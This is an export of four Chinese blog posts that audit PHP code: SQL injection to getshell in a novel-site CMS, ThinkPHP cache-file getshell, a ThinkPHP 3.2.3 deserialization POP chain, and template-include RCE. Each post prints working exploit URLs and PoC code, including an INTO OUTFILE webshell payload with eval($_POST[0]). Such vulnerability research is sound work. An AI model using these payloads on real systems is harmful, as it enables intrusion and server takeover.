{"posts":[{"title":"PHP代码审计—某雨小说CMS注入到Getshell","content":"前言 论坛有位老哥发了某个基于TP5框架开发的一个小说网站的注入漏洞， 拿到源码分析一下 环境搭建 CMS版本：1.4.2 官网地址： 狂雨小说cms - 狂雨小说cms - Powered by HYBBS (kyxscms.com) Payload 报错: http://127.0.0.1/?s=api/news/category&amp;cid=updatexml(1,concat(0x7e,user(),0x7e),1)%20--+- getshell: // 需要有导出文件权限并且知道绝对路径 http://127.0.0.1/?s=api/news/category&amp;cid='&lt;?php phpinfo()?&gt;' into outfile '/var/wzww/html/test.php' 漏洞分析 该cms基于ThinkPHP V5.1.33 LTS开发 漏洞触发点在 \\application\\api\\controller\\News.php category方法获取了三个参数，三个参数可控，重点关注$cid public function category($cid=false,$type=1,$filter=false){ $category=model('api/api')-&gt;category($cid,$type,$filter); return json([&quot;code&quot;=&gt;1,&quot;data&quot;=&gt;$category]); } 跟进 category($cid,$type,$filter) 方法 这里主要关注get_nav方法的第五个参数，Request::param('cid'),获取了我们传入的$cid参数, get_nav 第一个参数和第五个参数是一样的，但是只有第五个参数能造成注入 get_nav函数形参只有五个，但是这里传入了六个参数，这里不会报错，多余的参数不做处理 感觉这里像是故意留的后门。 public function category($cid,$type,$filter){ $api=model('common/api'); $api-&gt;api_url=true; $category=$api-&gt;get_nav($cid,$type,$filter,false,Request::param('cid'),'id,title,pid,icon,type'); foreach ($category as $key =&gt; $value) { $class[$key]=$value; if($value['branch']==1){ $class[$key]['subor']=$this-&gt;category($value['id'],$type,$filter); } } return $class; } 跟进get_nav($cid,$type,$filter,false,Request::param('cid'),'id,title,pid,icon,type')方法 这里的 $category 和 $field 值是一样的，都是我们传入的 cid 的值, 这里也没进行任何过滤操作， where() 函数 采用了pdo预处理，而field()函数并没有，所以造成了注入 public function get_nav($category,$type,$limit,$cid,$field=true){ $map = ['status' =&gt; 1,'pid' =&gt; $category]; if($type!==false){ $map['type']=$type; } $data=Db::name('category')-&gt;field($field)-&gt;where($map)-&gt;limit($limit)-&gt;order('sort')-&gt;select(); ...... } 跟进field($field)方法，这里处理的是 知道查询的字段，并没有进行结构化处理， 如果$field为字符串，并且有[、]、&lt;、'、&quot;、( 字符时， 调用fieldRaw()方法，将其变成一个查询表达式，并返回，并未进行过滤处理 /** * 指定查询字段 支持字段排除和指定数据表 * @access public * @param mixed $field * @param boolean $except 是否排除 * @param string $tableName 数据表名 * @param string $prefix 字段前缀 * @param string $alias 别名前缀 * @return $this */ public function field($field, $except = false, $tableName = '', $prefix = '', $alias = '') { if (empty($field)) { return $this; } elseif ($field instanceof Expression) { $this-&gt;options['field'][] = $field; return $this; } if (is_string($field)) { if (preg_match('/[\\&lt;\\'\\&quot;\\(]/', $field)) { return $this-&gt;fieldRaw($field); } $field = array_map('trim', explode(',', $field)); } if (true === $field) { // 获取全部字段 $fields = $this-&gt;getTableFields($tableName); $field = $fields ?: ['*']; } elseif ($except) { // 字段排除 $fields = $this-&gt;getTableFields($tableName); $field = $fields ? array_diff($fields, $field) : $field; } if ($tableName) { // 添加统一的前缀 $prefix = $prefix ?: $tableName; foreach ($field as $key =&gt; &amp;$val) { if (is_numeric($key) &amp;&amp; $alias) { $field[$prefix . '.' . $val] = $alias . $val; unset($field[$key]); } elseif (is_numeric($key)) { $val = $prefix . '.' . $val; } } } if (isset($this-&gt;options['field'])) { $field = array_merge((array) $this-&gt;options['field'], $field); } $this-&gt;options['field'] = array_unique($field); return $this; } 然后直接跟进 select() 方法，\\thinkphp\\library\\think\\db\\Connection.php /** * 查找记录 * @access public * @param Query $query 查询对象 * @return array|\\PDOStatement|string * @throws DbException * @throws ModelNotFoundException * @throws DataNotFoundException */ public function select(Query $query) { // 分析查询表达式 $options = $query-&gt;getOptions(); if (empty($options['fetch_sql']) &amp;&amp; !empty($options['cache'])) { $resultSet = $this-&gt;getCacheData($query, $options['cache'], null, $key); if (false !== $resultSet) { return $resultSet; } } // 生成查询SQL $sql = $this-&gt;builder-&gt;select($query); ...... } 跟进生成查询sql $this-&gt;builder-&gt;select() 方法 \\thinkphp\\library\\think\\db\\Builder.php public function select(Query $query) { $options = $query-&gt;getOptions(); return str_replace( ['%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'], [ $this-&gt;parseTable($query, $options['table']), $this-&gt;parseDistinct($query, $options['distinct']), $this-&gt;parseField($query, $options['field']), $this-&gt;parseJoin($query, $options['join']), $this-&gt;parseWhere($query, $options['where']), $this-&gt;parseGroup($query, $options['group']), $this-&gt;parseHaving($query, $options['having']), $this-&gt;parseOrder($query, $options['order']), $this-&gt;parseLimit($query, $options['limit']), $this-&gt;parseUnion($query, $options['union']), $this-&gt;parseLock($query, $options['lock']), $this-&gt;parseComment($query, $options['comment']), $this-&gt;parseForce($query, $options['force']), ], $this-&gt;selectSql); } 跟进 parseField()方法, 并未对$fields 参数进行任何过滤，也没进行参数绑定结构化查询处理, 直接替换在了 select 语句后面 所以造成了注入 protected function parseField(Query $query, $fields) { if ('*' == $fields || empty($fields)) { $fieldsStr = '*'; } elseif (is_array($fields)) { // 支持 'field1'=&gt;'field2' 这样的字段别名定义 $array = []; foreach ($fields as $key =&gt; $field) { if (!is_numeric($key)) { $array[] = $this-&gt;parseKey($query, $key) . ' AS ' . $this-&gt;parseKey($query, $field, true); } else { $array[] = $this-&gt;parseKey($query, $field); } } $fieldsStr = implode(',', $array); } return $fieldsStr; } 参考文章 某小说cms某处sql注入漏洞 ","link":"https://bewhale.github.io/post/PHP代码审计—某雨小说CMS注入到Getshell/"},{"title":"PHP代码审计—ThinkPHP5.0.10-3.2.3缓存Getshell","content":"前言 thinkphp缓存漏洞的触发点以及生成的缓存文件的文件名 一般需要结合代码 审计来找到， 因为使用S() 或者 Cache() 函数的位置不确定，调用函数的传参变量也不确定 thinkphp3.2.3 漏洞复现 控制器添加test方法，如下 &lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8'); } public function test(){ S('cache',I('x')); } } 浏览器访问 http://192.168.1.8/index.php?s=/Home/index/test&amp;x=test 在Application/Runtime/Temp/文件夹下成功生成了php文件 &lt;?php //000000000000s:4:&quot;test&quot;; ?&gt; 传参内容被注释掉了，参数未过滤%0d%0a 可以以此来绕过行注释，访问 http://192.168.1.8/index.php?s=/Home/index/test&amp;x=%0d%0aphpinfo();// 成功绕过注释,生成文件 0fea6a13c52b4d4725368f24b045ca84.php, 因为调用缓存函数时传参是 S('cache',I('x')); 所以生成的缓存文件名是 md5(cache).php &lt;?php //000000000000s:16:&quot; phpinfo(); //&quot;; ?&gt; url: http://192.168.1.8/Application/Runtime/Temp/0fea6a13c52b4d4725368f24b045ca84.php 漏洞分析 首先跟进S 方法，经过一系列判断调用了 set 方法 function S($name,$value='',$options=null) { static $cache = ''; if(is_array($options)){ // 缓存操作的同时初始化 $type = isset($options['type'])?$options['type']:''; $cache = Think\\Cache::getInstance($type,$options); }elseif(is_array($name)) { // 缓存初始化 $type = isset($name['type'])?$name['type']:''; $cache = Think\\Cache::getInstance($type,$name); return $cache; }elseif(empty($cache)) { // 自动初始化 $cache = Think\\Cache::getInstance(); } if(''=== $value){ // 获取缓存 return $cache-&gt;get($name); }elseif(is_null($value)) { // 删除缓存 return $cache-&gt;rm($name); }else { // 缓存数据 if(is_array($options)) { $expire = isset($options['expire'])?$options['expire']:NULL; }else{ $expire = is_numeric($options)?$options:NULL; } return $cache-&gt;set($name, $value, $expire); } } 然后跟进到/Library/Think/Cache/File.class.php文件，可以看到 $data 未经任何过滤，序列化过后，直接被写到文件内 序列化过后，payload被有双引号包裹，最后还有分号 s:10:&quot;phpinfo();&quot;; 然后在前面拼接上注释符号，所以这里在payload前面使用 %0d%0a 回车换行绕过， 后面我们在payload后面添加注释符，注释掉序列化数据生成的&quot;和; payload: http://192.168.1.8/index.php?s=/Home/index/test&amp;x=%0d%0aphpinfo();// public function set($name,$value,$expire=null) { N('cache_write',1); if(is_null($expire)) { $expire = $this-&gt;options['expire']; } $filename = $this-&gt;filename($name); $data = serialize($value); if( C('DATA_CACHE_COMPRESS') &amp;&amp; function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data,3); } if(C('DATA_CACHE_CHECK')) {//开启数据校验 $check = md5($data); }else { $check = ''; } $data = &quot;&lt;?php\\n//&quot;.sprintf('%012d',$expire).$check.$data.&quot;\\n?&gt;&quot;; $result = file_put_contents($filename,$data); if($result) { if($this-&gt;options['length']&gt;0) { // 记录缓存队列 $this-&gt;queue($name); } clearstatcache(); return true; }else { return false; } } 跟进 $this-&gt;filename($name)方法 private function filename($name) { $name = md5(C('DATA_CACHE_KEY').$name); if(C('DATA_CACHE_SUBDIR')) { // 使用子目录 $dir =''; for($i=0;$i&lt;C('DATA_PATH_LEVEL');$i++) { $dir .= $name{$i}.'/'; } if(!is_dir($this-&gt;options['temp'].$dir)) { mkdir($this-&gt;options['temp'].$dir,0755,true); } $filename = $dir.$this-&gt;options['prefix'].$name.'.php'; }else{ $filename = $this-&gt;options['prefix'].$name.'.php'; } return $this-&gt;options['temp'].$filename; } 文件名 由 调用缓存函数时传参$name 和 配置文件里面的参数DATA_CACHE_KEY、DATA_CACHE_SUBDIR、DATA_CACHE_PREFIX 共同决定，但是配置文件里面这些参数一般默认为空 S('cache',I('x')); // 所以一般情况下文件名为 md5(cache).php // 0fea6a13c52b4d4725368f24b045ca84.php thinkphp5.0.5 原理类似，缓存文件的路径不一样 protected function getCacheKey($name) { $name = md5($name); if ($this-&gt;options['cache_subdir']) { // 使用子目录 $name = substr($name, 0, 2) . DS . substr($name, 2); } if ($this-&gt;options['prefix']) { $name = $this-&gt;options['prefix'] . DS . $name; } $filename = $this-&gt;options['path'] . $name . '.php'; $dir = dirname($filename); if (!is_dir($dir)) { mkdir($dir, 0755, true); } return $filename; } 缓存文件位置 b0 文件夹是 md5($name) 前 2 位。 http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php 参考文章 ThinkPHP3.2.3~5.0.10缓存函数设计缺陷可导致Getshell Thinkphp3.2.3-5.0.10缓存漏洞 | h3art3ars Thinkphp-5.0.5-缓存漏洞 - Thinkphp/Thinkphp-5.x-漏洞 ","link":"https://bewhale.github.io/post/PHP代码审计—ThinkPHP5.0.10-3.2.3缓存Getshell/"},{"title":"PHP代码审计—ThinkPHP3.2.3反序列化","content":"基本概念 序列化 所有 PHP 里面的值都可以使用 serialize() 函数将其转换为一个可以存储的字符串，也就是序列化。 所谓序列化，就是将一个在内存中的变量转换为可保存或传输的字符串的过程。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 另外，为了能够反序列化一个对象，这个对象的类必须已经定义过。 如果序列化类 A 的一个对象，将会返回一个跟类 A 相关，而且包含了对象所有变量值的字符串。 反序列化 反序列化就是在适当的时候使用unserialize()函数把序列化字符串再转化成原来的变量使用。 这两个过程结合起来可以轻松的完成数据的存储和传输操作，使得程序更具维护性。 魔术方法 我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法 常用的一些魔术方法: __wakeup， unserialize() 执行前调用 __destruct， 对销毁的时候调用 __toString， 类被当成字符串时的回应方法 __construct()，当对象创建(new)时会自动调用，注意在unserialize()时并不会自动调用 __sleep()，serialize()时会先被调用 __call()，在对象中调用一个不可访问方法时调用 __callStatic()，用静态方式中调用一个不可访问方法时调用 __get()，获得一个类的成员变量时调用 __set()，设置一个类的成员变量时调用 __isset()，当对不可访问属性调用isset()或empty()时调用 __unset()，当对不可访问属性调用unset()时被调用。 __wakeup()，执行unserialize()时，先会调用这个函数 __toString()，类被当成字符串时的回应方法 __invoke()，调用函数的方式调用一个对象时的回应方法 __set_state()，调用var_export()导出类时，此静态方法会被调用。 __clone()，当对象复制完成时调用 __autoload()，尝试加载未定义的类 __debugInfo()，打印所需调试信息 POP 面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。 POP 链的构造是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据需要能够被用户输入所控制。 常见漏洞点 反序列化的常见起点 __wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 反序列化的常见终点 __call 调用不可访问或不存在的方法时被调用 call_user_func 一般php代码执行都会选择这里 call_user_func_array 一般php代码执行都会选择这里 反序列化的常见中间跳板 __toString 当一个对象被当做字符串使用 __get 读取不可访问或不存在属性时被调用 __set 当给不可访问或不存在属性赋值时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用 反序列化的常见终点: __call 调用不可访问或不存在的方法时被调用 call_user_func 一般php代码执行都会选择这里 call_user_func_array 一般php代码执行都会选择这里 Phar反序列化原理以及特征 phar://伪协议会在多个函数中反序列化其metadata部分 受影响的函数包括不限于如下: copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup, fileinode,filemtime,fileowner,fileperms, fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable, is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype, imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file, get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo 环境搭建 PHPstudy PHP: 5.6.9nts ThinkPHP: 3.2.3 Index控制器添加test方法,实现一个可控的反序列化的点 路径： /Application/Home/Controller/IndexController.class.php &lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8'); } public function test(){ unserialize(base64_decode($_GET[x])); } } 漏洞复现 通过pop 链构造，可实现报错注入和MySQL恶意服务端读取客户端文件 因为PDO默认是支持多语句查询的，所以这个点是可以堆叠注入的，可以尝试写shell pop 链构造 最终利用链 __destruct()-&gt;destroy()-&gt;delete()-&gt;Driver::delete()-&gt;Driver::execute()-&gt;Driver::initConnect()-&gt;Driver::connect()-&gt; poc1 &lt;?php //初始化数据库连接 namespace Think\\Db\\Driver { use PDO; class Mysql { protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;thinkphp&quot;, //数据库名 &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, //地址 &quot;hostport&quot; =&gt; &quot;3306&quot;, //端口 &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, //用户名 &quot;password&quot; =&gt; &quot;root&quot; //密码 ); } } namespace Think\\Image\\Driver { use Think\\Session\\Driver\\Memcache; class Imagick { private $img; public function __construct() { $this-&gt;img = new Memcache(); } } } namespace Think\\Session\\Driver { use Think\\Model; class Memcache { protected $handle; public function __construct() { $this-&gt;handle = new Model(); } } } namespace Think { use Think\\Db\\Driver\\Mysql; class Model { protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct() { $this-&gt;db = new Mysql(); $this-&gt;options['where'] = ''; $this-&gt;pk = 'id'; $this-&gt;data[$this-&gt;pk] = array( &quot;where&quot; =&gt; &quot; &quot; // where不能为空 &quot;table&quot; =&gt; &quot;mysql.users where 1=updatexml(1,user(),1)#&quot;, // 写shell // &quot;table&quot;=&gt;&quot;mysql.user where 1=2;select \\&quot;&lt;?php eval(\\$_POST[0]);?&gt;\\&quot; into outfile \\&quot;D:\\\\\\\\phpstudy_pro\\\\\\\\WWW\\\\\\\\1.php\\&quot;#&quot;, ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); } http://192.168.1.8/index.php?m=Home&amp;c=Index&amp;a=test&amp;x=TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjk5OiJteXNxbC51c2VyIHdoZXJlIDE9MjtzZWxlY3QgIjw/cGhwIGV2YWwoJF9QT1NUWzBdKTs/PiIgaW50byBvdXRmaWxlICJEOlxccGhwc3R1ZHlfcHJvXFxXV1dcXDEucGhwIiMiO3M6NToid2hlcmUiO3M6MToiICI7fX1zOjU6IgAqAGRiIjtPOjIxOiJUaGlua1xEYlxEcml2ZXJcTXlzcWwiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7aToxMDAxO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo1OiJkZWJ1ZyI7aToxO3M6ODoiZGF0YWJhc2UiO3M6ODoidGhpbmtwaHAiO3M6ODoiaG9zdG5hbWUiO3M6OToiMTI3LjAuMC4xIjtzOjg6Imhvc3Rwb3J0IjtzOjQ6IjMzMDYiO3M6NzoiY2hhcnNldCI7czo0OiJ1dGY4IjtzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6ODoicGFzc3dvcmQiO3M6NDoicm9vdCI7fX19fX0= poc2 &lt;?php namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick { private $img; public function __construct() { $this-&gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache { protected $handle; public function __construct(){ $this-&gt;handle = new Model(); } } } namespace Think { use Think\\Db\\Driver\\Mysql; class Model { protected $pk; protected $db; protected $data; public function __construct(){ $this-&gt;pk = 'id'; $this-&gt;data[$this-&gt;pk] = array( 'where'=&gt;'1=1', 'table'=&gt;'mysql.users where 1=updatexml(1,concat(0x7e,database(),0x7e),1)#' ); $this-&gt;db = new Mysql(); } } } namespace Think\\Db\\Driver{ use PDO; class Mysql { protected $config = array( 'type' =&gt; 'mysql', // 数据库类型 'hostname' =&gt; '127.0.0.1', // 服务器地址 'database' =&gt; 'thinkphp', // 数据库名 'username' =&gt; 'root', // 用户名 'password' =&gt; 'root', // 密码 'hostport' =&gt; '3306', // 端口 'dsn' =&gt; '', // 'params' =&gt; array(), // 数据库连接参数 'charset' =&gt; 'utf8', // 数据库编码默认采用utf8 'prefix' =&gt; '', // 数据库表前缀 'debug' =&gt; true, // 数据库调试模式 'deploy' =&gt; 0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器) 'rw_separate' =&gt; false, // 数据库读写是否分离 主从式有效 'master_num' =&gt; 1, // 读写分离后 主服务器数量 'slave_no' =&gt; '', // 指定从服务器序号 'db_like_fields' =&gt; '', ); protected $options = array( PDO::ATTR_CASE =&gt; PDO::CASE_LOWER, PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, PDO::ATTR_ORACLE_NULLS =&gt; PDO::NULL_NATURAL, PDO::ATTR_STRINGIFY_FETCHES =&gt; false, PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true, //读取本地文件 PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true, //把堆叠开了 ); } } namespace { echo base64_encode(serialize(new \\Think\\Image\\Driver\\Imagick())); } 漏洞分析 先从__destruct方法入手，全局搜索 路径：ThinkPHP/Library/Think/Image/Driver/Imagick.class.php /** * 析构方法，用于销毁图像资源 */ public function __destruct() { empty($this-&gt;img) || $this-&gt;img-&gt;destroy(); } 参数$this-&gt;img 是本类中$img这个成员变量，是完全可控的，并且调用了$this-&gt;img的destroy()， 全局搜索destroy方法, 来寻找一个含有destroy()成员方法的跳板类，跟进 路径：ThinkPHP/Library/Think/Session/Driver/Memcache.class.php /** * 删除Session * @access public * @param string $sessID */ public function destroy($sessID) { return $this-&gt;handle-&gt;delete($this-&gt;sessionName.$sessID); } $this-&gt;handle，$this-&gt;sessionName参数可控 无参数调用函数在 php7 中会判错，但是 php5 不会，所以版本利用有限 跟进delete方法 路径：ThinkPHP/Mode/Lite/Model.class.php public function delete($options = array()) { $pk = $this-&gt;getPk(); if (empty($options) &amp;&amp; empty($this-&gt;options['where'])) { if (!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])) { return $this-&gt;delete($this-&gt;data[$pk]); } else { return false; } } if (is_numeric($options) || is_string($options)) { if (strpos($options, ',')) { $where[$pk] = array('IN', $options); } else { $where[$pk] = $options; } $options = array(); $options['where'] = $where; } if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) { $count = 0; foreach (array_keys($options) as $key) { if (is_int($key)) { $count++; } } if (count($pk) == $count) { $i = 0; foreach ($pk as $field) { $where[$field] = $options[$i]; unset($options[$i++]); } $options['where'] = $where; } else { return false; } } $options = $this-&gt;_parseOptions($options); if (empty($options['where'])) { return false; } if (is_array($options['where']) &amp;&amp; isset($options['where'][$pk])) { $pkValue = $options['where'][$pk]; } if (false === $this-&gt;_before_delete($options)) { return false; } $result = $this-&gt;db-&gt;delete($options); if (false !== $result &amp;&amp; is_numeric($result)) { $data = array(); if (isset($pkValue)) { $data[$pk] = $pkValue; } $this-&gt;_after_delete($data, $options); } return $result; } 在第二次调用delete方法时，调用了数据库驱动类中的delete 路径：ThinkPHP/Library/Think/Db/Driver.class.php public function delete($options = array()) { $this-&gt;model = $options['model']; $this-&gt;parseBind(!empty($options['bind']) ? $options['bind'] : array()); $table = $this-&gt;parseTable($options['table']); $sql = 'DELETE FROM ' . $table; if (strpos($table, ',')) { if (!empty($options['using'])) { $sql .= ' USING ' . $this-&gt;parseTable($options['using']) . ' '; } $sql .= $this-&gt;parseJoin(!empty($options['join']) ? $options['join'] : ''); } $sql .= $this-&gt;parseWhere(!empty($options['where']) ? $options['where'] : ''); if (!strpos($table, ',')) { $sql .= $this-&gt;parseOrder(!empty($options['order']) ? $options['order'] : '') . $this-&gt;parseLimit(!empty($options['limit']) ? $options['limit'] : ''); } $sql .= $this-&gt;parseComment(!empty($options['comment']) ? $options['comment'] : ''); return $this-&gt;execute($sql, !empty($options['fetch_sql']) ? true : false); } 关键代码： $table = $this-&gt;parseTable($options['table']); $sql = 'DELETE FROM ' . $table; return $this-&gt;execute($sql, !empty($options['fetch_sql']) ? true : false); 这里$table经过parseTable函数后拼接到 sql 语句中，最后执行 sql 语句 跟进parseTable protected function parseTable($tables) { if (is_array($tables)) { $array = array(); foreach ($tables as $table =&gt; $alias) { if (!is_numeric($table)) { $array[] = $this-&gt;parseKey($table) . ' ' . $this-&gt;parseKey($alias); } else { $array[] = $this-&gt;parseKey($alias); } } $tables = $array; } elseif (is_string($tables)) { $tables = explode(',', $tables); array_walk($tables, array(&amp;$this, 'parseKey')); } return implode(',', $tables); } 其中的数据经过parseKey处理，跟进 protected function parseKey(&amp;$key) { return $key; } 直接返回，无任何过滤, 那么最后返回结果执行execute方法 跟进，该函数开头有初始化连接操作 $this-&gt;initConnect(true); 跟进 protected function initConnect($master = true) { if (!empty($this-&gt;config['deploy'])) { $this-&gt;_linkID = $this-&gt;multiConnect($master); } else if (!$this-&gt;_linkID) { $this-&gt;_linkID = $this-&gt;connect(); } } 再跟进connect public function connect($config = '', $linkNum = 0, $autoConnection = false) { if (!isset($this-&gt;linkID[$linkNum])) { if (empty($config)) { $config = $this-&gt;config; } try { if (empty($config['dsn'])) { $config['dsn'] = $this-&gt;parseDsn($config); } if (version_compare(PHP_VERSION, '5.3.6', '&lt;=')) { $this-&gt;options[PDO::ATTR_EMULATE_PREPARES] = false; } $this-&gt;linkID[$linkNum] = new PDO($config['dsn'], $config['username'], $config['password'], $this-&gt;options); } catch (\\PDOException $e) { if ($autoConnection) { trace($e-&gt;getMessage(), '', 'ERR'); return $this-&gt;connect($autoConnection, $linkNum); } elseif ($config['debug']) { E($e-&gt;getMessage()); } } } return $this-&gt;linkID[$linkNum]; } 这里控制 $this-&gt;config 来连接数据库，用 mysql 类来实例化,接着去执行前面拼接的DELETESQL语句 因此我们只需要在 Mysql 下配置好数据库配置即可 参考文章 PHP serialize()与unserialize()：序列化与反序列化 ThinkPHP 3.2.3 反序列化&amp;sql注入漏洞分析 | Y0ng的博客 ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链 ThinkPHP3.2.x （SQL注入&amp;文件读取）反序列化POP链_H3rmesk1t的博客-CSDN博客 挖掘暗藏ThinkPHP中的反序列利用链 - 斗象能力中心 ","link":"https://bewhale.github.io/post/PHP代码审计—ThinkPHP3.2.3反序列化/"},{"title":"PHP代码审计—ThinkPHP3.2.X远程代码执行","content":"前言 该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。个人感觉这个漏洞虽然不如thinkphp本体的一些RCE漏洞影响范围大，但也算是提供了一个思路，对基于某些框架二次开发的系统，寻找其不规范的方法调用的思路还是值得学习的。 漏洞复现 控制器添加test方法，写入模板赋值assign的 Demo &lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8'); } public function test($value){ $this-&gt;assign($value); $this-&gt;display(); } } 因为该漏洞利用的assign函数需要模板渲染，所以需要对应的模板文件，与demo相对应的文件路径： view下创建一个Index目录，然后在Index目录下面新建test.html文件进行视图渲染，文件内容随意 目录：\\Application\\Home\\View\\Index\\test.html 创建日志文件： http://192.168.1.8/index.php?c=&lt;?php=phpinfo();?&gt; // 没有给调用的模块参数，默认为Home， 控制器报错，日志在 Application/Runtime/Logs/Home 下面 http://192.168.1.8/index.php?m=--&gt;&lt;?=phpinfo();?&gt; // 模块报错， 日志在 Application/Runtime/Logs/Common下面 日志文件目录： 开启debug 请求不报错 日志文件在 对应的模块下面 比如Home模块 路径：Application/Runtime/Logs/Home下 请求会报错 如果是模块错误 日志文件在 Application/Runtime/Logs/Common下 如果是控制器或者方法错误 日志文件在对应的模块下面 比如Home模块 路径：Application/Runtime/Logs/Home 下 关闭debug 请求不会报错 不会记录日志 请求会报错 保存的位置和开启debug一致 包含日志文件： http://192.168.1.8/index.php?m=Home&amp;c=Index&amp;a=test&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_08.log 